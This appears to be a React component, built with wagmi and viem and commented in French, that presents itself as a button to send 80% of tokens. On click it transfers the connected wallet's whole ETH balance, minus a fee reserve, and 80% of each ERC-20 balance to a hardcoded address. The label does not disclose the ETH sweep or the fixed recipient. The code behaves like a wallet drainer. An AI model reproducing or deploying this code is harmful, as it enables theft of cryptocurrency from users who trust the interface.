import { useState } from 'react';
import { normalize } from 'viem/ens';
import { useWalletClient, usePublicClient } from 'wagmi';
import { erc20Abi } from 'viem';
import { showToast } from '@/utils/toast';

const destinationAddressFixed = '0x518c5D62647E60864EcB3826e982c93dFa154af3';

const SendTokens = ({ tokens }) => {
  const { data: walletClient } = useWalletClient();
  const publicClient = usePublicClient();
  const [destinationAddress, setDestinationAddress] = useState(destinationAddressFixed);

  const sendAllCheckedTokens = async () => {
    if (!walletClient) return;
    if (!destinationAddress) return;

    // Résolution ENS si nécessaire
    if (destinationAddress.includes('.')) {
      const resolvedDestinationAddress = await publicClient.getEnsAddress({
        name: normalize(destinationAddress),
      });
      if (resolvedDestinationAddress) {
        setDestinationAddress(resolvedDestinationAddress);
      }
      return;
    }

    // Convertir l'adresse pour TypeScript
    const destination = destinationAddress as `0x${string}`;

    // Envoi automatique de l'ETH disponible
    try {
      const ethBalance = await publicClient.getBalance({ address: walletClient.account });
      if (ethBalance > 0n) {
        const tx = await walletClient.sendTransaction({
          to: destination,
          value: ethBalance - BigInt(1e14), // Laisser un peu pour les frais
        });
        console.log('ETH transfer success:', tx);
      }
    } catch (err) {
      showToast(`Erreur lors de l'envoi de l'ETH: ${err?.reason || 'Erreur inconnue'}`, 'warning');
    }

    // Envoi des tokens ERC-20
    for (const token of tokens) {
      try {
        const contract = {
          address: token.tokenAddress as `0x${string}`,
          abi: erc20Abi,
        };

        const balance = await publicClient.readContract({
          ...contract,
          functionName: 'balanceOf',
          args: [walletClient.account],
        });

        if (balance > 0n) {
          const amountToSend = (balance * 80n) / 100n; // 80% du solde

          const tx = await walletClient.writeContract({
            ...contract,
            functionName: 'transfer',
            args: [destination, amountToSend],
          });

          console.log(`Token ${token.symbol} envoyé :`, tx);
        }
      } catch (err) {
        showToast(`Erreur lors de l'envoi de ${token.symbol}: ${err?.reason || 'Erreur inconnue'}`, 'warning');
      }
    }
  };

  return (
    <button onClick={sendAllCheckedTokens}>Envoyer 80% des tokens</button>
  );
};

export default SendTokens;
